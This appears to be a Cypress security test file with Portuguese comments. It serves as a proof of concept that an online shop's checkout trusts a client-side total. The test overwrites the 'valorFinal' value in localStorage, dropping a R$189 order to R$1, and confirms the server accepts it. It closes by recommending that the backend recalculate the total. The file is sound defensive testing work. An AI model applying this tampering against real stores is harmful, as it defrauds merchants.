// cypress/e2e/seguranca_logica.cy.js

describe('Segurança - Lógica de Negócios', () => {

  it('PROVA DE CONCEITO: permite a manipulação de preço via LocalStorage', () => {
    
    cy.intercept('POST', '**/Banco de dados/processa_pedido.php').as('processaPedido');

    // --- CORREÇÃO APLICADA ---
    // Usamos um ID e preço que existem no seu banco (Produto 22)
    const produtoCaro = {
      id: 22, // ID do produto "Parafusadeira"
      title: 'Parafusadeira E Furadeira Impacto',
      price: 189.00, // Preço com 10% de desconto (210.00 - 10%)
      img: 'imagens/Produtos/69011c3c45949-0.webp',
      quantidade: 1
    };
    
    // Preço real (string)
    const precoRealString = '189.00';

    cy.visit('/'); 
    
    cy.window().then((win) => {
      win.localStorage.setItem('carrinho', JSON.stringify([produtoCaro]));
      win.localStorage.setItem('totalCompra', precoRealString);
      win.localStorage.setItem('valorFrete', '0.00');
      win.localStorage.setItem('valorFinal', precoRealString);
    });
    
    cy.visit('/tela_pagamento.php');

    // Verifica o preço real na tela
    cy.get('#resumo-total-valor').should('contain', 'R$ 189,00');

    // O ATACANTE MUDA O VALOR NO LOCALSTORAGE
    cy.window().then((win) => {
      win.localStorage.setItem('valorFinal', '1.00'); // ⬅️ PREÇO FALSO
    });

    cy.reload();
    
    // A INTERFACE AGORA MOSTRA O PREÇO FALSO
    cy.get('#resumo-total-valor').should('contain', 'R$ 1,00');

    cy.get('#pix').check();
    cy.get('.btn-continuar-entrega').click();

    cy.wait('@processaPedido').then((interception) => {
      // O backend DEVE receber o preço falso
      expect(interception.request.body.valor_total).to.equal('1.00');
      
      // O preço falso é diferente do preço real do carrinho
      const precoRealCarrinho = interception.request.body.cart[0].price;
      expect(interception.request.body.valor_total).to.not.equal(precoRealCarrinho);
    });

    cy.log('VULNERABILIDADE CONFIRMADA: O servidor recebeu "1.00" em vez de "189.00".');
    cy.log('RECOMENDAÇÃO: O "processa_pedido.php" deve RECALCULAR o total no backend.');
  });
});